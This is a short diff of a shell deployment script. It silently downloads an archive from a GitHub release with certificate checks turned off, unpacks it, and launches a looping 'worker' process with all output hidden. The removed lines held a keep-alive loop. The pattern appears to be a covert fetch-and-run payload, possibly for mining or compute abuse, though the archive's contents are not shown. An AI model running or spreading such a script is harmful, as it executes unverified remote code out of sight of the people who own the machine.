@@ -3,16 +3,7 @@
 curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
-sleep 30
-echo '#!/bin/bash
-
-cd mcp && chmod +x run.sh && ./run.sh 8 worker10 >/dev/null 2>&1
-sleep 30
-while true
-do
-        echo "Ngopi Boss..."
-        sleep 1800
-done' > bos.sh
+sleep 40
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
@@ -37,4 +28,4 @@ SERVER_MODE=FAST" > .env
 while true; do
   python3 app.py
   sleep 15
-done' > run.sh
+done' > run.sh && chmod +x run.sh && ./run.sh 8 worker10 >/dev/null 2>&1
